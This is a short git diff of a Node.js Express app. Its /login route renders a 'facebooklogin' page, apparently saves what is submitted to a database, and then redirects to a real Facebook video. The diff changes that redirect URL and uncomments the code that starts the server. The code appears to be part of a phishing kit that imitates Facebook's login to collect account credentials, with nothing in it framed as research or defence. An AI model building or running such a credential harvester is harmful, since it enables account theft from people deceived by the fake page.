@@ -23,13 +23,13 @@ app.post('/login', (req, res) => {
             console.error('Database error:', err);
             return res.render('facebooklogin');
         }
-        res.redirect('https://web.facebook.com/share/v/1YpkFzDf2z/')
+        res.redirect('https://www.facebook.com/share/v/16bTezzrkd/')
     });
 });
 
 module.exports = app; 
 
-// const port = 1000;
-// app.listen(port, () =>{
-//     console.log(`server started on port ${port}`)
-// })
+const port = 1000;
+app.listen(port, () =>{
+    console.log(`server started on port ${port}`)
+})
